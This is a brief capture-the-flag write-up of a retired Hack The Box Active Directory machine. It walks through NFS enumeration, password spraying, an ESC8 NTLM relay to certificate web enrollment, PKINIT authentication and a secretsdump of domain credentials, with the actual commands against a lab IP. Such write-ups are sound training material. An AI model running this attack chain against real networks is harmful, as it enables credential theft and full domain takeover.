---
title: "HTB: VulnCicada"
description: "A medium Windows Active Directory path: NFS leak, password reuse, ESC8 web enrollment relay, DNS spoofing, PKINIT, and secretsdump."
date: 2026-06-09
platform: "Hack The Box"
difficulty: "Medium"
os: "Windows"
thumbnail: "/assets/images/writeup-cicada.svg"
reading_time: "8 min read"
tags: ["active-directory", "nfs", "esc8", "ntlm-relay", "pkinit"]
---

## Scope

This is the structure I want for retired HTB machines: enough detail to be useful later, but focused on decisions instead of dumping every command.

## Enumeration

I start with a full TCP scan, then follow up with service scripts on anything interesting.

```bash
nmap -p- --min-rate 5000 -oN scans/all-tcp.txt 10.10.10.10
nmap -sCV -p 53,80,88,111,135,139,389,445,2049 -oN scans/services.txt 10.10.10.10
```

The important clue was NFS. Anonymous mounting exposed a photo directory with a note that looked harmless until the metadata gave me a candidate password.

## Foothold

Password spraying against SMB found a low-privileged domain user. From there, BloodHound showed certificate services and a vulnerable enrollment path.

```bash
netexec smb 10.10.10.10 -u users.txt -p 'REDACTED' --continue-on-success
certipy find -u user@domain.local -p 'REDACTED' -dc-ip 10.10.10.10 -vulnerable
```

## Privilege Escalation

ESC8 made the attack path clear: coerce machine authentication, relay to AD CS web enrollment, request a machine certificate, then use PKINIT.

```bash
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template DomainController
certipy auth -pfx dc.pfx -dc-ip 10.10.10.10
secretsdump.py -k domain.local/dc$
```

## Lessons Learned

- NFS is worth checking even on Windows-heavy boxes.
- Certificate Services findings deserve a separate checklist.
- Screenshots and metadata can be credentials in disguise.
- Write the chain down while solving; AD paths get messy fast.
